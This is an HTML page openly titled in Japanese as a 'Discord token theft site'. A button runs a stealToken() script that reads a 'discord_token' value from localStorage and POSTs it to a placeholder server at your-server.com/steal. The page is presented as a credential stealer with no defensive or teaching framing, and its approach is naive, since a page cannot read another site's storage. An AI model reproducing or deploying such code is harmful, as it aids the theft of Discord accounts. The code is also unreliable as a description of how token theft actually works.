<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ディスコードトークン奪取サイト</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            padding: 50px;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            display: inline-block;
        }
        .button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #7289da;
            color: white;
            border: none;
            border-radius: 4px;
        }
        .button:hover {
            background-color: #5a67d8;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ディスコードトークン奪取サイト</h1>
        <p>ボタンをクリックしてください。</p>
        <button class="button" onclick="stealToken()">クリックしてください</button>
    </div>

    <script>
        function stealToken() {
            // ディスコードのトークンを取得
            const token = localStorage.getItem('discord_token');

            if (token) {
                // トークンをサーバーに送信
                fetch('https://your-server.com/steal', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ token: token })
                })
                .then(response => response.json())
                .then(data => {
                    console.log('トークンが成功してサーバーに送信されました:', data);
                })
                .catch(error => {
                    console.error('トークン送信エラー:', error);
                });
            } else {
                console.log('ディスコードトークンが見つかりません');
            }
        }
    </script>
</body>
</html>
